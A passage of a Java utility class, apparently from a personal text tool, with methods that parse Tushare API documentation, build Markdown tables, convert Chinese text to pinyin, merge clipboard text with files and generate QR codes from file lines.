	public static ArrayList<String> Tushare_TreeNodeData_Rule18(ArrayList<String> content) {

		// showArrList(content);

		ArrayList<String> headList = getTushare_EndTagList(content, "", "输入参数");
		showArrList(headList);
		String webSite = null;
		String chineseTitle = null;
		String pythonMethodName = null;
		String chinesetitle_WebSite = guolvArrList(headList, "https://"); // 包含 https的那一行

		if (chinesetitle_WebSite != null && !"".equals(chinesetitle_WebSite)) {
			webSite = clearChinese(chinesetitle_WebSite).trim();
			chineseTitle = chinesetitle_WebSite.replace(webSite, "").trim();
		}
		String JieKou_Str = guolvArrList(headList, "接口：");
		if (JieKou_Str != null && !"".equals(JieKou_Str)) {
			pythonMethodName = clearChinese(JieKou_Str).trim().replace("：", "");
		}

		ArrayList<String> input_params_list = getTushare_EndTagList(content, "输入参数", "输出参数");

		ArrayList<String> inputList = clearAllChineseLine(input_params_list);
//        showArrList(inputList);
//        System.out.println("--------------3--------------");
		ArrayList<String> output_params_list = getTushare_EndTagList(content, "输出参数", "");
		ArrayList<String> outputList = clearAllChineseLine(output_params_list);
//        showArrList(outputList);

		ArrayList<String> templateArr = new ArrayList<String>();

		templateArr.add("〖" + chineseTitle + "     " + webSite);
		ArrayList<String> paramA = addTushare_Params_Flag_18(inputList, "〖*", "*");
		templateArr.addAll(paramA);
		String title_pinyin = Rule14_ToPinyinWithLine(chineseTitle).replace("_", "");
		String methodLine_pre = title_pinyin + "       【】[] <" + pythonMethodName + "> ( ) ";
		String methodLine_end = clearOneBlankCharAsOneStr_Rule_2(outputList).get(0);
		String methodLine = methodLine_pre + methodLine_end;
		templateArr.add(methodLine);
		showArrList(templateArr);
		return templateArr;
	}

	public static ArrayList<String> clearAllChineseLine(ArrayList<String> content) {
		ArrayList<String> clear_all_Chinese_Line_List = new ArrayList<String>();

		for (int i = 0; i < content.size(); i++) {
			String item = content.get(i);
			String fixed_item = clearChinese(item).trim();
			fixed_item = fixed_item.replace("\t", "");
			fixed_item = fixed_item.replace("：", "");
			if ("".equals(fixed_item)) {
				continue;
			}
			clear_all_Chinese_Line_List.add(item);
		}

		return clear_all_Chinese_Line_List;
	}

	public static String guolvArrList(ArrayList<String> content, String tag) {

		String result = "";
		for (int i = 0; i < content.size(); i++) {
			String item = content.get(i);
			if (item.contains(tag)) {
				result = item;
				return result;
			}
		}
		return result;
	}

	public static ArrayList<String> getTushare_EndTagList(ArrayList<String> content, String beginTag, String endTag) {
		ArrayList<String> tagList = new ArrayList<String>();

		boolean isBegin = false; // 是否从头开始读取
		if (beginTag == null) {
			isBegin = true;
		} else {
			isBegin = "".equals(beginTag) ? true : false;
		}

		for (int i = 0; i < content.size(); i++) {
			String item = content.get(i);
			if (!"".equals(beginTag) && item.contains(beginTag)) {
				isBegin = true;
				continue;
			}

			if (!"".equals(endTag) && item.contains(endTag)) {
				isBegin = false;
				break;
			}
			if (!isBegin) { // 如果没有开始 那么 不记录当前的字符串
				continue;
			}
			if ("".equals(item.trim())) {
				continue;
			}
			tagList.add(item);
		}

		return tagList;
	}

	public static void showArrList(ArrayList<String> content) {

		for (int i = 0; i < content.size(); i++) {
			String line = content.get(i);
			System.out.println("[ " + i + " ] = " + line);
		}

	}

	// 往 每行开头加入〖* 第一个字符串后加入* 其余不变(方便生成tushare的输入参数格式) ts_code -> 〖*ts_code* 描述
	static ArrayList<String> addTushare_Params_Flag_18(ArrayList<String> originStrList, String beginStr,
													   String endStr) {
		ArrayList<String> newContentList_Padding = new ArrayList<String>();
		ArrayList<String> newContentList = new ArrayList<String>();
		for (int i = 0; i < originStrList.size(); i++) {
			String originStr = originStrList.get(i);
			String item = new String(originStr);
			item = item.replace("\t", " ").trim();
			item = item.replace("：", " ").trim();
			item = item.replace("  ", " ").trim();
			String[] arr = item.split(" ");
			String fixedStr = "";
			String firstBlankStr = "";
			if (arr == null) {
				firstBlankStr = endStr;
				fixedStr = beginStr + item + firstBlankStr;
			} else {
				firstBlankStr = arr[0] + endStr;
				fixedStr = item.replace(arr[0], firstBlankStr);
				fixedStr = beginStr + fixedStr;
			}
			newContentList.add(fixedStr);
		}

		int maxPointSize = calMaxItemCharPosition(newContentList, endStr) + 2;

		for (int i = 0; i < newContentList.size(); i++) {
			String item = newContentList.get(i);
			int curIndex = item.lastIndexOf(endStr);
			int paddingInt = maxPointSize - curIndex;
			String paddingStr = getEmptyString(paddingInt);
			item = item.replace(endStr + " ", endStr + " " + paddingStr);
			newContentList_Padding.add(item);
		}

		return newContentList_Padding;

	}

	static int calMaxItemCharPosition(ArrayList<String> originStrList, String strFlag) {

		int maxSize = 0;
		for (int i = 0; i < originStrList.size(); i++) {
			String item = originStrList.get(i);
			int curIndex = item.lastIndexOf(strFlag);
			if (curIndex > maxSize) {
				maxSize = curIndex;
			}
		}
		return maxSize;
	}

	ArrayList<String> addZhanWeiFlag_Rule_10(ArrayList<String> originStrList, String beginStr, String endStr) {
		ArrayList<String> newContentList = new ArrayList<String>();
		for (int i = 0; i < originStrList.size(); i++) {
			newContentList.add(beginStr + originStrList.get(i).trim() + endStr);
		}

		return newContentList;

	}

	// Rule_11 Begin 把表格 3x3 转为 MD文件格式 加入 |---| 分割符号
	public static final ArrayList<String> Rule11_tableItemList = new ArrayList<>();
	public static int Rule11_rowInLine = 0;

	public static String getRule11_rowInLine(File file) {

		String titleString = null;
		String sumString = "";
		try {
			BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(file), "utf-8"));
			titleString = curBR.readLine().trim();
			System.out.println("FirstLineA = " + titleString);

			while ("\t".equals(titleString) || "".equals(titleString)) {
				titleString = curBR.readLine().trim();
				System.out.println("FirstLineA_A = " + titleString);
			}
			while (titleString.contains("\t")) {
				titleString = titleString.replaceAll("\t", " ");
			}
			while (titleString.contains("  ")) {
				titleString = titleString.replaceAll("  ", " ");
			}

			System.out.println("titleStringB = " + titleString);
			String[] strArr = titleString.split(" ");
			Rule11_rowInLine = strArr.length;
//            Rule11_rowInLine = getFramePaddingChineseLength(strArr);

			for (String item : strArr) {
				sumString = sumString + " | " + item;
			}
			sumString = sumString + " |";
			Rule11_tableItemList.add(sumString);

			String twoLine = "";
			for (int i = 0; i < Rule11_rowInLine; i++) {

				twoLine = twoLine + "| ---- ";
			}
			twoLine = twoLine + "| ";
			Rule11_tableItemList.add(twoLine);

			curBR.close();
		} catch (Exception e) {
			e.printStackTrace();

		}
		return sumString;
	}

	public static ArrayList<String> getMDtable_ForCommonText_Rule_11(File srcFile) {

		ArrayList<String> newContentList = new ArrayList<String>();

		String headLine = getRule11_rowInLine(srcFile);
		System.out.println("Rule11_rowInLine = " + Rule11_rowInLine);
		if (srcFile != null) {
			try {
				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(srcFile), "utf-8"));
				String oldOneLine = "";

				while ((oldOneLine = curBR.readLine()) != null && !oldOneLine.isEmpty()) {
					break; // 跳过首行 当做标题的那行
				}

				oldOneLine = "";
				int countLine = 1;
				while (oldOneLine != null) {
					oldOneLine = curBR.readLine();
					if (oldOneLine == null || "\t".equals(oldOneLine.trim()) || oldOneLine.trim().isEmpty()) {
						System.out.println("oldOneLine = " + oldOneLine + "   跳过!");
						continue;
					}
					String tableItem = new String(oldOneLine);

					while (tableItem.contains("\t")) {
						tableItem = tableItem.replaceAll("\t", " ");
					}

					while (tableItem.contains("  ")) {
						tableItem = tableItem.replaceAll("  ", " ");
					}
					String[] strArr = tableItem.split(" ");
					int length = 0; //
					if (strArr.length >= Rule11_rowInLine) {
						length = Rule11_rowInLine;
					} else {
						length = strArr.length;
//                        length = getFramePaddingChineseLength(strArr);
					}
					String sumString = "";
					for (int i = 0; i < length; i++) {
						sumString = sumString + " | " + strArr[i];
					}
					sumString = sumString + " |";
					if (length < Rule11_rowInLine) {
						int blankCount = Rule11_rowInLine - length;
						for (int j = 0; j < blankCount; j++) {
							sumString = sumString + "  | ";
						}
					}
					System.out.println("sumString[" + countLine + "] = " + sumString);
					countLine++;
					if (!Rule11_tableItemList.contains(sumString)) {
						System.out.println("加入 headLine = " + headLine + "  sumString = " + sumString);
						Rule11_tableItemList.add(sumString);
					} else {
						System.out.println("头部相同 不加入! headLine = " + headLine + "  sumString = " + sumString);
					}

				}
				curBR.close();

//                BufferedWriter curBW = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(mFilePath)), "utf-8"));

				for (int i = 0; i < Rule11_tableItemList.size(); i++) {
//                    curBW.write(Rule11_tableItemList.get(i).trim());
					newContentList.add(Rule11_tableItemList.get(i).trim());
//                    curBW.newLine();
				}
//                curBW.close();
				System.out.println("OK !");
			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}
		return newContentList;
	}

	// Rule_11 End 把表格 2x2 3x3 4x4 ... 转为 MD文件格式 加入 |---| 分割符号

	// Rule_12 Begin 把 剪切板的字符串 逐行 复制 到当前 文本的 逐行 后边 A6
	static ArrayList<String> Rule12_curFileStringList = new ArrayList<String>();
	static ArrayList<String> Rule12_clipStringList = new ArrayList<String>();
	static int Rule12_SPACE = 12;
	static int Rule12_MAX_LENGTH_CLIP = 0; // 剪切板的行数
	static int maxLength_old_line = 0;

	public static ArrayList<String> BoardCopyStrToLeft_Rule_12(File srcFile) {

		ArrayList<String> newContentList = new ArrayList<String>();

		String clipStr = Rule12_getSysClipboardText().trim();
		System.out.println("clipStr = " + clipStr);
		if (clipStr.trim().equals("")) {
			System.out.println("clip String is empty or null!");
			newContentList.add("剪切板的内容为空!  请重新复制到剪切板!");
			return newContentList;
		}

		String[] arrLine = clipStr.split("\n");
		int arrLength = arrLine.length;
		int currentMaxLength = 0;
		if (arrLine != null) {
			currentMaxLength = Rule12_getMaxLengthInArr(arrLine);
			Rule12_MAX_LENGTH_CLIP = currentMaxLength;
		}

		for (int i = 0; i < arrLength; i++) {
			System.out.println("index = 【" + i + " 】   item=" + arrLine[i]);
			Rule12_clipStringList.add(arrLine[i]);
		}
		// String source = new String(clipStr.replaceAll("\r|\n", ""));

		//

		Rule12_tryReadContentFromFile(srcFile); // 读取旧的文件内容
		maxLength_old_line = Rule12_getMaxLengthInArr(Rule12_curFileStringList);

		return Rule12_tryWriteNewContentToFile(Rule12_clipStringList, Rule12_curFileStringList, srcFile);
		// 对当前文件重新进行处理

	}

	static void Rule12_tryReadContentFromFile(File file) {

		if (file != null && file.exists()) {

			try {
				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(file), "utf-8"));
				String lineStr = "";

				while (lineStr != null) {
					lineStr = curBR.readLine();
					if (lineStr == null || lineStr.trim().isEmpty()) {
						continue;
					}
					lineStr = lineStr.replace("\t", "    ");
					Rule12_curFileStringList.add(lineStr);
				}
				curBR.close();

				System.out.println("read json File OK !");
			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}
	}

	static String getRule12_SPACE(int num) {
		String str = "";
		for (int i = 0; i < num; i++) {
			str = str + " ";
		}

		return str;
	}

	static ArrayList<String> Rule12_tryWriteNewContentToFile(ArrayList<String> clipList, ArrayList<String> oldList,
															 File file) {

		ArrayList<String> newStrList = new ArrayList<String>();
		if (file != null && file.exists()) {

// String curItem = "#  "+new String(netAddr);
//                BufferedWriter curBW = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file), "utf-8"));
			// curBW.write(curItem);

			int clipListSize = clipList.size();
			int oldListListSize = oldList.size();
			int maxRow = 0;
			if (clipListSize > oldListListSize) {
				maxRow = clipListSize;

			} else {
				maxRow = oldListListSize;
			}

			for (int i = 0; i < maxRow; i++) {
				String clipItem = null;
				if (i >= clipList.size()) {
					clipItem = getEmptyString(maxLength_old_line);
				} else {
					clipItem = clipList.get(i).trim();
				}

				String oldItem = null;
				if (i >= oldList.size()) {
					oldItem = getEmptyString(maxLength_old_line);
				} else {
					oldItem = oldList.get(i);
				}

				int currentNeedRule12_SPACE = maxLength_old_line
						- (oldItem != null ? getFramePaddingChineseLength(oldItem) : 0) + Rule12_SPACE;

//                int currentNeedRule12_SPACE = Rule12_MAX_LENGTH_CLIP - (clipItem != null ? clipItem.length() : 0) + Rule12_SPACE;
				String newItem = oldItem + getRule12_SPACE(currentNeedRule12_SPACE)
						+ (clipItem != null ? clipItem.trim() : "");
				System.out.println("xxxx");
				System.out.println(
						"原有的 oldItem.length = " + (oldItem != null ? getFramePaddingChineseLength(oldItem) : 0));
				System.out.println("maxLength_old_line = " + maxLength_old_line + " currentNeedRule12_SPACE = "
						+ currentNeedRule12_SPACE);
				System.out.println(" oldItem = " + oldItem);
				System.out.println(" newItem = " + newItem);
				System.out.println("xxxx");
//                    curBW.write(newItem);
//                    curBW.newLine();
				newStrList.add(newItem);
			}
//                curBW.close();
			System.out.println("write file OK !");

		} else {
			System.out.println("Failed !");
			newStrList.add("操作执行失败!  请重新执行!");
		}
		return newStrList;
	}

	static int Rule12_getMaxLengthInArr(ArrayList<String> arr) {
		int maxLength = 0;
		if (arr != null) {
			int arrlength = arr.size();

			for (int i = 0; i < arrlength; i++) {
				String item = arr.get(i);
				// getFramePaddingChineseLength()
				int curssidLength = getFramePaddingChineseLength(item);
//                int curssidLength = item.length();
				if (curssidLength > maxLength) {
					maxLength = curssidLength;
				}
			}

		}
		return maxLength;
	}

	static int Rule12_getMaxLengthInArr(String[] arr) {
		int maxLength = 0;
		if (arr != null) {
			int arrlength = arr.length;

			for (int i = 0; i < arrlength; i++) {
				String item = arr[i];
				// getFramePaddingChineseLength()
				int curssidLength = getFramePaddingChineseLength(item);
//                int curssidLength = item.length();
				if (curssidLength > maxLength) {
					maxLength = curssidLength;
				}
			}

		}
		return maxLength;
	}

	public static String Rule12_getSysClipboardText() {
		String ret = "";
		Clipboard sysClip = Toolkit.getDefaultToolkit().getSystemClipboard();
		// 获取剪切板中的内容
		Transferable clipTf = sysClip.getContents(null);

		if (clipTf != null) {
			// 检查内容是否是文本类型
			if (clipTf.isDataFlavorSupported(DataFlavor.stringFlavor)) {
				try {
					ret = (String) clipTf.getTransferData(DataFlavor.stringFlavor);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}

		return ret;
	}

	// Rule_12 End 把 剪切板的字符串 逐行 复制 到当前 文本的 逐行 后边 A6

	// Rule_13 Begin 去除掉当前文件中的中文 每一个中文 以一个空格代替 A7

	private static String Rule13_REGEX_CHINESE = "[\u4e00-\u9fa5]";

	public static ArrayList<String> add_md_code_block_format_Rule_40(File srcFile) {
		ArrayList<String> newContent = new ArrayList<String>();

		newContent.add("---                                       ");
		newContent.add("layout: post                              ");
		newContent.add("title: 粘贴墙板               ");
		newContent.add("category: 工具                            ");
		newContent.add("tags: Tool                                ");
		newContent.add("keywords: 粘贴                        ");
		newContent.add("typora-root-url: ..\\..\\                   ");
		newContent.add("typora-copy-images-to: ..\\..\\public\\zimage");
		newContent.add("---                                       ");
		newContent.add("");
		newContent.add("## 简介                                   ");
		newContent.add(" * TOC                                    ");
		newContent.add(" {:toc}                                   ");
		newContent.add("");
		newContent.add("## 粘贴墙板                       ");
		newContent.add("");
		newContent.add("### 汉语");
		newContent.add("");
		newContent.add("### Code");
		newContent.add("");
		newContent.add("### 英语");
		File curFile = srcFile;

		if (curFile != null) {

			FileReader curReader;
			try {

				curReader = new FileReader(curFile);

				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(curFile), "utf-8"));
				String oldOneLine = "";
				String newOneLine = "";

				while (oldOneLine != null) {

					oldOneLine = curBR.readLine();
					if (oldOneLine == null || oldOneLine.trim().isEmpty()) {
						String lastItemStr = null;
						if (newContent.size() > 0) {
							lastItemStr = newContent.get(newContent.size() - 1);
						}

						if (oldOneLine != null && "```".equals(oldOneLine.trim())) { // 如果当前 只包含 ``` 那么 直接跳过
							continue;
						}

						if (lastItemStr != null && !"".equals(lastItemStr)) {
//                        		newContent.add("");
						}

						continue;
					}

					if ("```".equals(oldOneLine.trim())) {
						continue;
					}

					// 把 所有的 ` 去掉
					newOneLine = oldOneLine.replace("`", "").trim();

					String append_oneLine = "\n```\n" + newOneLine + "\n```\n";

					if (!newContent.contains(append_oneLine)) { // 去除 重复
						newContent.add(append_oneLine);
					}

				}
				curBR.close();

			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}

		return newContent;
	}

	public static String MakeContent_As_OneStrLine_Rule_41(File srcFile) {

		StringBuilder newContent = new StringBuilder();

		File curFile = srcFile;

		if (curFile != null) {

			FileReader curReader;
			try {

				curReader = new FileReader(curFile);

				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(curFile), "utf-8"));
				String oldOneLine = "";
				String newOneLine = "";

				while (oldOneLine != null) {

					oldOneLine = curBR.readLine();
					if (oldOneLine == null || oldOneLine.trim().isEmpty()) {
						continue;
					}

					newContent.append(oldOneLine + " ");
				}
				curBR.close();

			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}
		return newContent.toString();
	}

	public static ArrayList<String> add_system_out_Rule_21(File srcFile) {
		ArrayList<String> newContent = new ArrayList<String>();

		File curFile = srcFile;

		if (curFile != null) {

			FileReader curReader;
			try {

				curReader = new FileReader(curFile);

				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(curFile), "utf-8"));
				String oldOneLine = "";
				String newOneLine = "";

				while (oldOneLine != null) {

					oldOneLine = curBR.readLine();
					if (oldOneLine == null || oldOneLine.trim().isEmpty()) {
						newContent.add("System.out.println();");
						continue;
					}

//                    System.out.println(" \"this is test string\" ");
//                    System.out.println("adb shell am broadcast -a com.Android.test --es<string> test_string \"this is test string\" —ei<int> test_int 100 —ez<boolean> test_boolean true");
					newOneLine = new String(oldOneLine);

					newOneLine = newOneLine.replace("\\", "\\\\");

					newOneLine = newOneLine.replace("\"", "\\\"");
					newOneLine = newOneLine.replace(".\\", ".\\\\"); // .\w .\w

					// 把 [.bat ] 转为 ["+BAT_OR_SH_Point+"]
					// 把 [.sh ] 转为 ["+BAT_OR_SH_Point+"]

					newOneLine = newOneLine.replace(".bat ", "\"+BAT_OR_SH_Point+\"" + " \" +\"");
					newOneLine = newOneLine.replace(".sh ", "\"+BAT_OR_SH_Point+\"" + " \" +\"");

					newOneLine = "System.out.println(\"" + newOneLine.trim() + "\");";

					newContent.add(newOneLine.trim());
				}
				curBR.close();

			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}
		return newContent;
	}

	public static ArrayList<String> clearChinese_Rule_13(File srcFile) {
		ArrayList<String> newContent = new ArrayList<String>();

		File curFile = srcFile;

		if (curFile != null) {

			FileReader curReader;
			try {

				curReader = new FileReader(curFile);

				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(curFile), "utf-8"));
				String oldOneLine = "";
				String newOneLine = "";

				while (oldOneLine != null) {

					oldOneLine = curBR.readLine();
					if (oldOneLine == null || oldOneLine.trim().isEmpty()) {
						continue;
					}

					newOneLine = new String(oldOneLine);
					if (Rule13_isContainChinese(newOneLine)) {
						newOneLine = Rule13_clearChinese(newOneLine);

					}
					newContent.add(newOneLine.trim());
				}
				curBR.close();

			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}
		return newContent;
	}

	public static boolean Rule13_isContainChinese(String str) {
		Pattern p = Pattern.compile(Rule13_REGEX_CHINESE);
		Matcher m = p.matcher(str);
		if (m.find()) {
			return true;
		}
		return false;
	}

	public static String Rule13_clearChinese(String lineContent) {
		if (lineContent == null || lineContent.trim().isEmpty()) {
			return null;
		}
		Pattern pat = Pattern.compile(Rule13_REGEX_CHINESE);
		Matcher mat = pat.matcher(lineContent);
		return mat.replaceAll(" ");
	}

	// Rule_13 Begin 去除掉当前文件中的中文 每一个中文 以一个空格代替 A7

	// Rule_14 Begin 汉字转换为拼音 周 zhou 中国 zhong_guo (A9)
	public static ArrayList<String> Chinese_To_PinYin_Rule_14(File srcFile) {

		// System.out.println(Rule14_ToFirstChar("ABC 汉字转换为拼音CBA").toUpperCase());
		// //转为首字母大写
		// System.out.println(Rule14_ToPinyinWithLine("A周 B杰 C伦"));
		// System.out.println(Rule14_ToPinyinWithLine("ABC汉字转换为拼音CBA"));
		ArrayList<String> StringArr = new ArrayList<>();

		File curFile = srcFile;

		if (curFile != null) {
			try {
				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(curFile), "utf-8"));
				String oldOneLine = "";
				String newOneLine = "";

				while (oldOneLine != null) {

					oldOneLine = curBR.readLine();
					if (oldOneLine == null || oldOneLine.trim().isEmpty()) {
						continue;
					}

					newOneLine = new String(oldOneLine);
					newOneLine = Rule14_ToPinyinWithLine(newOneLine);
					if (newOneLine != null && !newOneLine.trim().isEmpty()) {
						StringArr.add(newOneLine);
					}

				}
				curBR.close();

			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}
		return StringArr;
	}

	/**
	 * 获取字符串拼音的第一个字母
	 *
	 * @param chinese
	 * @return
	 */
	public static String Rule14_ToFirstChar(String chinese) {
		String pinyinStr = "";
		char[] newChar = chinese.toCharArray(); // 转为单个字符
		HanyuPinyinOutputFormat defaultFormat = new HanyuPinyinOutputFormat();
		defaultFormat.setCaseType(HanyuPinyinCaseType.LOWERCASE);
		defaultFormat.setToneType(HanyuPinyinToneType.WITHOUT_TONE);
		for (int i = 0; i < newChar.length; i++) {
			if (newChar[i] > 128) {
				try {
					pinyinStr += PinyinHelper.toHanyuPinyinStringArray(newChar[i], defaultFormat)[0].charAt(0); // charAt(0)
				} catch (BadHanyuPinyinOutputFormatCombination e) {
					e.printStackTrace();
				}
			} else {
				pinyinStr += newChar[i];
			}
		}
		return pinyinStr;
	}

	/**
	 * 汉字转为拼音
	 *
	 * @param chinese
	 * @return
	 */
	public static String Rule14_ToPinyin(String chinese) {
		if (chinese == null || chinese.trim().isEmpty()) {
			return null;
		}
		String curItem = new String(chinese);
		while (curItem.contains(" ")) {
			curItem = curItem.replaceAll(" ", "");
		}
		String pinyinStr = "";
		char[] newChar = curItem.toCharArray();
		HanyuPinyinOutputFormat defaultFormat = new HanyuPinyinOutputFormat();
		defaultFormat.setCaseType(HanyuPinyinCaseType.LOWERCASE);
		defaultFormat.setToneType(HanyuPinyinToneType.WITHOUT_TONE);
		for (int i = 0; i < newChar.length; i++) {
			if (newChar[i] > 128) {
				try {
					pinyinStr += PinyinHelper.toHanyuPinyinStringArray(newChar[i], defaultFormat)[0]; // [0] 标识当前拼音 汉->
					// han
				} catch (BadHanyuPinyinOutputFormatCombination e) {
					e.printStackTrace();
				}
			} else { // 汉字的编码是大于 128的 所以 小于 128编码的就直接认为是 ascii编码的
				pinyinStr += newChar[i];
			}
		}
		return pinyinStr;
	}

	/**
	 * 汉字转为拼音 汉字---> HanZi
	 *
	 * @param chinese
	 * @return
	 */
	public static String Rule14_ToPinyin_WithFirstBig(String chinese) {
		if (chinese == null || chinese.trim().isEmpty()) {
			return null;
		}
		String curItem = new String(chinese);
		while (curItem.contains(" ")) {
			curItem = curItem.replaceAll(" ", "");
		}
		String pinyinStr = "";
		char[] newChar = curItem.toCharArray();
		HanyuPinyinOutputFormat defaultFormat = new HanyuPinyinOutputFormat();
		defaultFormat.setCaseType(HanyuPinyinCaseType.LOWERCASE);
		defaultFormat.setToneType(HanyuPinyinToneType.WITHOUT_TONE);
		for (int i = 0; i < newChar.length; i++) {
			if (newChar[i] > 128) {
				try {
					pinyinStr += toUpperFirstChar(PinyinHelper.toHanyuPinyinStringArray(newChar[i], defaultFormat)[0]); // [0]
					// 标识当前拼音
					// 汉->
					// han
				} catch (BadHanyuPinyinOutputFormatCombination e) {
					e.printStackTrace();
				}
			} else { // 汉字的编码是大于 128的 所以 小于 128编码的就直接认为是 ascii编码的
				pinyinStr += (newChar[i] + "");
			}
		}
		return pinyinStr;
	}

	public static String toUpperFirstChar(String srcStr) {
		if (srcStr == null) {
			return "";
		}
		String secondStr = srcStr.substring(1).toLowerCase();
		String firstChar = (srcStr.charAt(0) + "").toUpperCase();

		return firstChar + secondStr;

	}

	/**
	 * 汉字转为拼音 空间以下划线_分割 1.每个汉字前面添加_ 2.每个汉字后面添加_ 3.把所有的两个__ 下划线转为 一个下划线
	 *
	 * @param chinese
	 * @return
	 */
	public static String Rule14_ToPinyinWithLine(String chinese) {
		if (chinese == null || chinese.trim().isEmpty()) {
			return null;
		}
		String curItem = new String(chinese);
		while (curItem.contains(" ")) {
			curItem = curItem.replaceAll(" ", "");
		}
		String pinyinStr = "";
		char[] newChar = curItem.toCharArray();
		HanyuPinyinOutputFormat defaultFormat = new HanyuPinyinOutputFormat();
		defaultFormat.setCaseType(HanyuPinyinCaseType.LOWERCASE);
		defaultFormat.setToneType(HanyuPinyinToneType.WITHOUT_TONE);
		for (int i = 0; i < newChar.length; i++) {
			if (newChar[i] > 128) {
				try {
					// 《》，：“￥。，？。，；【 】。、

					System.out.println("xxxxxxxxxx");
					System.out.println("newChar[" + i + "] = " + newChar[i]);
					String charStr = newChar[i] + "";
					if (charStr.equals("《")) {
						pinyinStr += "<";
						continue;
					} else if (charStr.equals("》")) {
						pinyinStr += ">";
						continue;
					} else if (charStr.equals("，")) {
						pinyinStr += ",";
						continue;
					} else if (charStr.equals("：")) {
						pinyinStr += ":";
						continue;
					} else if (charStr.equals("“")) {
						pinyinStr += "\"";
						continue;
					} else if (charStr.equals("￥")) {
						pinyinStr += "$";
						continue;
					} else if (charStr.equals("？")) {
						pinyinStr += "?";
						continue;
					} else if (charStr.equals("；")) {
						pinyinStr += ";";
						continue;
					} else if (charStr.equals("【")) {
						pinyinStr += "[";
						continue;
					} else if (charStr.equals("】")) {
						pinyinStr += "]";
						continue;
					} else if (charStr.equals("、")) {
						pinyinStr += ",";
						continue;
					}

					String[] arrChar = PinyinHelper.toHanyuPinyinStringArray(newChar[i], defaultFormat);
					if (arrChar == null) {
						System.out.println("pinyinStr = " + null);
						continue;
					}
					pinyinStr += "_" + arrChar[0] + "_"; // [0] 标识当前拼音 汉-> han
					System.out.println("pinyinStr = " + pinyinStr);
					System.out.println("xxxxxxxxxx ");
				} catch (BadHanyuPinyinOutputFormatCombination e) {
					e.printStackTrace();
				}
			} else { // 汉字的编码是大于 128的 所以 小于 128编码的就直接认为是 ascii编码的
				pinyinStr += newChar[i];
			}
		}
		while (pinyinStr.contains("__")) {
			pinyinStr = pinyinStr.replaceAll("__", "_");
			System.out.println("pinyinStr1 = " + pinyinStr);
		}

		while (pinyinStr.contains("u:")) { // 女转为 nu: 绿 lu: 需要转为 nv lv
			pinyinStr = pinyinStr.replaceAll("u:", "v");
			System.out.println("pinyinStr1 = " + pinyinStr);
		}

		while (pinyinStr.startsWith("_")) {
			pinyinStr = pinyinStr.substring(1, pinyinStr.length());
			System.out.println("pinyinStr2 = " + pinyinStr);
		}
		while (pinyinStr.endsWith("_")) {
			pinyinStr = pinyinStr.substring(0, pinyinStr.length() - 1);
			System.out.println("pinyinStr3 = " + pinyinStr);
		}
		return pinyinStr;
	}
	// Rule_14 End 汉字转换为拼音 周 zhou 中国 zhong_guo (A9)

	// 默认 只显示 第一行的 字符串
	// Rule_15 Begin 读取文件的第一行转为 二维码显示出来 B1
	public static void Pre50_TextAs_QrCode_Rule_15_Win(File srcFile) {
		File curFile = srcFile;
		if (curFile != null) {
			try {
				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(curFile), "utf-8"));
				String qrCodeString = "";

				while (qrCodeString != null && qrCodeString.trim().isEmpty()) {
					qrCodeString = curBR.readLine();
				}
				System.out.println("把扫描到的第一行非空字符串转为二维码  qrCodeString = " + qrCodeString);

				curBR.close();
				QrConfig config = new QrConfig();

				File targetFile = QrCodeUtil.generate(qrCodeString, config, new File(I9_OUT_DIR.getAbsolutePath()
						+ File.separator + getFileNameNoPoint(srcFile.getName()) + "_" + getTimeStampLong() + ".jpg"));

				RuntimeUtil.exec("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  "
						+ targetFile.getAbsolutePath());

			} catch (Exception e) {
				System.out.println("Exception !");
			}
		} else {
			System.out.println("Failed !");
		}
	}
	// Rule_15 End 读取文件的第一行转为 二维码显示出来 B1

	// 默认 只显示 第一行的 字符串
	// Rule_15 Begin 读取文件的第一行转为 二维码显示出来 B1
	public static void TextAs_QrCode_Rule_15_Mac(File srcFile) {
		File curFile = srcFile;
		ArrayList<String> TxtContent = new ArrayList<String>();
		ArrayList<String> Pre50_Content = new ArrayList<String>();

		if (curFile != null) {

			try {
				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(curFile), "utf-8"));
				String qrCodeString = "";

//                while (qrCodeString != null && qrCodeString.trim().isEmpty()) {
				while (qrCodeString != null) {
					qrCodeString = curBR.readLine();
					TxtContent.add(qrCodeString);
				}
				System.out.println("把扫描到的第一行非空字符串转为二维码  qrCodeString = " + qrCodeString);

				curBR.close();

				int lineNum = 1;
				for (int i = 0; i < TxtContent.size(); i++) {

					String lineStr = TxtContent.get(i);
					System.out.println("line[" + lineNum + "] = " + lineStr);
					lineNum++;
					if (Pre50_Content.size() < 50 && lineStr != null) {
						Pre50_Content.add(lineStr);
					}
				}

				QrConfig config = new QrConfig();
				ArrayList<File> targetFileList = new ArrayList<File>();
				for (int i = 0; i < Pre50_Content.size(); i++) {
					int lineIndex = i + 1;
					String content = Pre50_Content.get(i).trim();
					boolean isEmpty = "".equals(content);
					boolean isUrl = isValidUrl_String(content);
					File targetFile = null;
					if (isEmpty) {
						targetFile = calculBlankIndex(I9_Qr_Black_Image_File, lineIndex);
					} else {
						targetFile = QrCodeUtil.generate(content, config,
								new File(I9_OUT_DIR.getAbsolutePath() + File.separator
